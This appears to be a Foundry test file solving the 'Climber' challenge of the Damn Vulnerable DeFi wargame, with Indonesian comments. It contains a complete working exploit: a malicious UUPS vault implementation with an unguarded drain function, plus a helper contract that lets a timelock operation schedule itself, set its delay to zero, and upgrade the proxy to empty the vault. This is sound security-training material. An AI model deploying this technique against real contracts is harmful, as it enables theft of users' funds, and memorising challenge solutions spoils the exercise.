// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

// Implementasi jahat: mewarisi ClimberVault (agar proxiableUUID lolos
// cek _upgradeToAndCallUUPS di OZ 4.7) + fungsi drain tanpa guard apa pun.
contract ClimberVaultMalicious is ClimberVault {
    function drain(address tokenAddress, address recipient) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, token.balanceOf(address(this))), "Transfer failed");
    }
}

// Helper: memutus sirkularitas self-scheduling. Parameter operasi
// disimpan di storage SEBELUM execute dipanggil; saat timelock memanggil
// scheduleSelf() di tengah execute, helper memanggil timelock.schedule()
// dengan parameter yang tersimpan — data panggilan schedule TIDAK ada di
// dalam dataElements, jadi tidak ada self-reference. Dipanggil SETELAH
// grantRole PROPOSER_ROLE (langkah 2 batch), jadi schedule lolos.
contract ClimberAttacker {
    ClimberTimelock internal timelock;
    address[] internal targets;
    uint256[] internal values;
    bytes[] internal dataElements;
    bytes32 internal salt;

    constructor(address timelockAddress) {
        timelock = ClimberTimelock(payable(timelockAddress));
    }

    function setOperation(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _dataElements,
        bytes32 _salt
    ) external {
        targets = _targets;
        values = _values;
        dataElements = _dataElements;
        salt = _salt;
    }

    // Dipanggil timelock selama execute: menjadwalkan operasi yang sedang
    // dieksekusi. Cek state di akhir execute lalu lolos (operasi sudah
    // terjadwal, readyAtTimestamp = block.timestamp + delay 0).
    function scheduleSelf() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Root cause: ClimberTimelock.execute() mengeksekusi SEMUA panggilan
        // DULU, baru mengecek state operasi di akhir. Jadi operasi yang
        // belum terjadwal bisa menjadwalkan DIRINYA SENDIRI dari dalam
        // batch — asal panggilan schedule-nya tidak ada di dalam
        // dataElements (kalau ada, self-reference: data panggilan harus
        // meng-encode array yang memuat dirinya sendiri — mustahil).
        // Jalan keluarnya: helper contract yang menyimpan parameter
        // operasi di storage, lalu memanggil timelock.schedule() saat
        // dipanggil timelock di tengah execute. Batch: (1) updateDelay(0)
        // — timelock boleh memanggil dirinya sendiri; (2) grantRole
        // PROPOSER_ROLE ke helper — timelock punya ADMIN_ROLE (admin dari
        // PROPOSER_ROLE); (3) helper.scheduleSelf() — menjadwalkan operasi
        // yang sedang dieksekusi; (4) upgradeTo(implementasi jahat) pada
        // proxy vault — timelock adalah owner, lolos _authorizeUpgrade.
        // Cek akhir execute lolos karena operasi sudah terjadwal
        // (readyAtTimestamp = now + delay 0). Lalu drain() via proxy.
        ClimberVaultMalicious malicious = new ClimberVaultMalicious();
        ClimberAttacker attackerContract = new ClimberAttacker(address(climberTimelock));

        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(attackerContract);
        targets[3] = address(climberVaultProxy);

        uint256[] memory values = new uint256[](4);

        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            climberTimelock.PROPOSER_ROLE(),
            address(attackerContract)
        );
        dataElements[2] = abi.encodeWithSignature("scheduleSelf()");
        dataElements[3] = abi.encodeWithSignature("upgradeTo(address)", address(malicious));

        bytes32 salt = bytes32(0);

        attackerContract.setOperation(targets, values, dataElements, salt);

        vm.startPrank(attacker);
        climberTimelock.execute(targets, values, dataElements, salt);
        // Proxy kini menunjuk implementasi jahat -> drain tanpa guard
        ClimberVaultMalicious(address(climberVaultProxy)).drain(address(dvt), attacker);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
